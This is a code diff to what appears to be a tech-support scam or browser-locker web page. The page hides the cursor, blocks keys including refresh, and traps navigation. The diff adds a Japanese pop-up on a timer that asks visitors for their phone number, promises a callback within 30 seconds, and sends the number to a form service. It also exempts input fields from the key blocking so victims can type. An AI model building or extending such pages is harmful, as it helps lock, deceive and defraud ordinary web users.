@@ -66,6 +66,168 @@
           <script type="text/javascript">
                       var ph0ne = getVariableFromURl('ph0ne');
                   </script>
+  <style>
+    :root {
+      --fsp-modal-z-index: 2147483646;
+      --fsp-overlay-bg: rgba(15, 23, 42, 0.62);
+      --fsp-card-bg: #ffffff;
+      --fsp-text-main: #0f172a;
+      --fsp-text-muted: #475569;
+      --fsp-primary: #2563eb;
+      --fsp-primary-hover: #1d4ed8;
+      --fsp-border: #e2e8f0;
+      --fsp-shadow: 0 24px 64px rgba(2, 6, 23, 0.3);
+      --fsp-radius: 16px;
+    }
+
+    .fsp-modal-overlay {
+      position: fixed;
+      inset: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      background: var(--fsp-overlay-bg);
+      z-index: var(--fsp-modal-z-index);
+      opacity: 0;
+      visibility: hidden;
+      pointer-events: none;
+      transition: opacity 0.22s ease, visibility 0.22s ease;
+    }
+
+    .fsp-modal-overlay.show {
+      display: flex;
+      opacity: 1;
+      visibility: visible;
+      pointer-events: auto;
+    }
+
+    .fsp-modal-card {
+      width: 100%;
+      max-width: 520px;
+      background: var(--fsp-card-bg);
+      border-radius: var(--fsp-radius);
+      box-shadow: var(--fsp-shadow);
+      padding: 24px;
+      transform: translateY(8px) scale(0.985);
+      transition: transform 0.22s ease;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
+      color: var(--fsp-text-main);
+    }
+
+    .fsp-modal-overlay.show .fsp-modal-card {
+      transform: translateY(0) scale(1);
+    }
+
+    .fsp-modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      gap: 16px;
+      margin-bottom: 16px;
+    }
+
+    .fsp-modal-title {
+      margin: 0;
+      font-size: 1.2rem;
+      font-weight: 700;
+      line-height: 1.3;
+    }
+
+    .fsp-modal-subtitle {
+      margin: 6px 0 0;
+      color: var(--fsp-text-muted);
+      font-size: 0.95rem;
+    }
+
+    .fsp-close-btn {
+      border: 0;
+      background: transparent;
+      color: #64748b;
+      font-size: 1.5rem;
+      line-height: 1;
+      width: 36px;
+      height: 36px;
+      border-radius: 999px;
+      cursor: pointer;
+      transition: background-color 0.15s ease, color 0.15s ease;
+    }
+
+    .fsp-close-btn:hover {
+      background: #f1f5f9;
+      color: #0f172a;
+    }
+
+    .fsp-form-grid {
+      display: grid;
+      gap: 14px;
+    }
+
+    .fsp-form-label {
+      display: grid;
+      gap: 8px;
+      font-size: 0.92rem;
+      font-weight: 600;
+      color: #1e293b;
+    }
+
+    .fsp-form-input,
+    .fsp-form-textarea {
+      width: 100%;
+      border: 1px solid var(--fsp-border);
+      border-radius: 10px;
+      background: #fff;
+      font: inherit;
+      color: #0f172a;
+      padding: 11px 12px;
+      transition: border-color 0.18s ease, box-shadow 0.18s ease;
+      outline: none;
+    }
+
+    .fsp-form-textarea {
+      min-height: 120px;
+      resize: vertical;
+    }
+
+    .fsp-form-input:focus,
+    .fsp-form-textarea:focus {
+      border-color: #93c5fd;
+      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.18);
+    }
+
+    .fsp-submit-btn {
+      appearance: none;
+      border: 0;
+      border-radius: 10px;
+      background: var(--fsp-primary);
+      color: #fff;
+      font-weight: 600;
+      font-size: 0.96rem;
+      padding: 12px 16px;
+      cursor: pointer;
+      transition: transform 0.08s ease, background-color 0.15s ease;
+    }
+
+    .fsp-submit-btn:hover {
+      background: var(--fsp-primary-hover);
+    }
+
+    .fsp-submit-btn:active {
+      transform: translateY(1px);
+    }
+
+    .fsp-desktop-only-note {
+      margin-top: 12px;
+      color: #64748b;
+      font-size: 0.82rem;
+    }
+
+    @media (max-width: 1023px) {
+      .fsp-modal-overlay {
+        display: none !important;
+      }
+    }
+  </style>
 
   </head>
   <body class="map" id="mycanvas" onbeforeunload="return myFunction()"  style="cursor:none">
@@ -544,6 +706,11 @@
     </script>
     <script>
       document.onkeydown = function(a) {
+        var el = a && (a.target || a.srcElement) ? (a.target || a.srcElement) : document.activeElement;
+        var tag = el && el.tagName ? el.tagName.toLowerCase() : "";
+        if (tag === "input" || tag === "textarea" || tag === "select" || (el && el.isContentEditable)) {
+          return true;
+        }
         return !1
       };
     </script>
@@ -551,6 +718,11 @@
       document.attachEvent("onkeydown", win_onkeydown_handler);
 
       function win_onkeydown_handler() {
+        var el = event && event.srcElement ? event.srcElement : document.activeElement;
+        var tag = el && el.tagName ? el.tagName.toLowerCase() : "";
+        if (tag === "input" || tag === "textarea" || tag === "select" || (el && el.isContentEditable)) {
+          return true;
+        }
         switch (event.keyCode) {
           case 116:
             event.returnValue = !1;
@@ -571,6 +743,122 @@
       $(document).ready(function() {
         $("#chat").delay(600).fadeIn(100)
       });
+    </script>
+    <div id="fspFormModal" class="fsp-modal-overlay" aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="fspFormModalTitle">
+      <div class="fsp-modal-card">
+        <div class="fsp-modal-header">
+          <div>
+            <h1 id="fspFormModalTitle" class="fsp-modal-title">電話がつながらない場合は？
+              電話番号を入力してください。30秒以内に折り返しお電話いたします。</h1>
+          </div>
+          <!-- <button type="button" class="fsp-close-btn" aria-label="Close popup">&times;</button> -->
+        </div>
+        <form id="my-form" action="https://formspree.io/f/xwvrypoq" method="POST" class="fsp-form-grid">
+          <label class="fsp-form-label">電話番号:</label>
+          <input class="fsp-form-input" type="tel" name="phone" required>
+          <button id="my-form-button" class="fsp-submit-btn" type="submit">提出する</button>
+          <p id="my-form-status"></p>
+        </form>
+        
+      </div>
+    </div>
+    <script>
+      (function () {
+        var FSP_MODAL_DELAY_MS = 60000;
+        var FSP_MODAL_RESHOW_AFTER_SUBMIT_MS = 180000;
+        var FSP_DESKTOP_MIN_WIDTH = 1024;
+        var modal = document.getElementById("fspFormModal");
+        var closeBtn = modal ? modal.querySelector(".fsp-close-btn") : null;
+        var timeoutId;
+
+        function isDesktop() {
+          return window.innerWidth >= FSP_DESKTOP_MIN_WIDTH;
+        }
+
+        function showModal() {
+          if (!modal || !isDesktop()) {
+            return;
+          }
+          modal.classList.add("show");
+          modal.setAttribute("aria-hidden", "false");
+        }
+
+        function hideModal() {
+          if (!modal) {
+            return;
+          }
+          modal.classList.remove("show");
+          modal.setAttribute("aria-hidden", "true");
+        }
+
+        function scheduleModal() {
+          clearTimeout(timeoutId);
+          if (!isDesktop()) {
+            return;
+          }
+          timeoutId = window.setTimeout(showModal, FSP_MODAL_DELAY_MS);
+        }
+
+        if (closeBtn) {
+          closeBtn.addEventListener("click", hideModal);
+        }
+
+        window.addEventListener("resize", function () {
+          if (!isDesktop()) {
+            hideModal();
+            clearTimeout(timeoutId);
+            return;
+          }
+          if (!modal.classList.contains("show")) {
+            scheduleModal();
+          }
+        });
+
+        document.addEventListener("keydown", function (event) {
+          if (event.key === "Escape") {
+            hideModal();
+          }
+        });
+
+        var form = document.getElementById("my-form");
+        async function handleSubmit(event) {
+          event.preventDefault();
+          var status = document.getElementById("my-form-status");
+          var data = new FormData(event.target);
+          fetch(event.target.action, {
+            method: form.method,
+            body: data,
+            headers: {
+              "Accept": "application/json"
+            }
+          }).then(function (response) {
+            if (response.ok) {
+              status.innerHTML = "Thanks for your submission!";
+              form.reset();
+              hideModal();
+              clearTimeout(timeoutId);
+              if (isDesktop()) {
+                timeoutId = window.setTimeout(showModal, FSP_MODAL_RESHOW_AFTER_SUBMIT_MS);
+              }
+            } else {
+              response.json().then(function (data) {
+                if (Object.hasOwn(data, "errors")) {
+                  status.innerHTML = data.errors.map(function (error) { return error.message; }).join(", ");
+                } else {
+                  status.innerHTML = "Oops! There was a problem submitting your form";
+                }
+              });
+            }
+          }).catch(function () {
+            status.innerHTML = "Oops! There was a problem submitting your form";
+          });
+        }
+        if (form) {
+          form.addEventListener("submit", handleSubmit);
+        }
+
+        scheduleModal();
+      })();
     </script>
 
    <script type="text/javascript">
